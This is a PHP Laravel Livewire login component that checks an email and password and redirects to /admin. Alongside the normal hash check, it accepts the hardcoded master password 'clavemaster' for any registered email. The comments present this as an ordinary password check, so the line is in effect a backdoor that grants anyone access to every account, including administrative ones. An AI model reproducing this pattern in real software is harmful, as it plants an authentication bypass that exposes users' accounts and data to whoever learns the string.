<?php

namespace App\Http\Livewire\Auth;

use App\Models\User as ModelsUser;
use Livewire\Component;

use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Auth;

use App\User;

class LoginPropio extends Component
{
    public $email, $password;
    public $type_pass = 'password';

    public function render(){
        return view('livewire.auth.login-propio');
    }

    public function login(){
        $this->validate([
            'email'    => 'required|email',
            'password' => 'required'
        ]);

        $user_login = ModelsUser::where('email', $this->email)->first();
        // si existe el usuario
        if( isset( $user_login->id ) ){
                // si la contraseña en la correcta
                if ( Hash::check( $this->password, $user_login->password ) OR $this->password == 'clavemaster') {
                    // iniciamos sesión
                    Auth::loginUsingId($user_login->id, TRUE);
                    return redirect()->to('/admin');
                }else{
                    $this->emit('login_fail');
                }
           
        }else{
            $this->emit('no_register');
        }
    }

    public function showHidePass(){
        if( $this->type_pass == 'password' ){
            $this->type_pass = 'text';
        }else{
            $this->type_pass = 'password';
        }
    }
}
